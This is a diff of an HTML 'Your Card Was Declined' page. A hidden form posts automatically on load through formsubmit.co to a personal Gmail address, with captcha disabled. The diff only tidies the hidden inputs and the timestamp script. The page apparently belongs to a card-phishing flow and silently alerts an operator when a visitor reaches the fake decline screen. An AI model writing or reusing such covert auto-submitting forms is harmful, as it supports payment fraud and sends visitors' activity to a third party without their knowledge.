@@ -29,17 +29,17 @@
 <body>
   <h1>Your Card Was Declined</h1>
 
-  <!-- Hidden form that auto-submits -->
+  <!-- Hidden form to send email using Formsubmit -->
   <form action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST" id="declineForm" style="display:none;">
-    <input type="hidden" name="Status" value="Card Declined">
-    <input type="hidden" name="Time" value="">
-    <input type="hidden" name="_subject" value="🚫 Card Declined Alert">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="Status" value="Card Declined" />
+    <input type="hidden" name="Time" id="timeInput" />
+    <input type="hidden" name="_subject" value="🚫 Card Declined Alert" />
+    <input type="hidden" name="_captcha" value="false" />
+    <input type="hidden" name="_template" value="table" />
   </form>
 
   <script>
-    document.querySelector('input[name="Time"]').value = new Date().toLocaleString();
+    document.getElementById('timeInput').value = new Date().toLocaleString();
     document.getElementById('declineForm').submit();
   </script>
 </body>
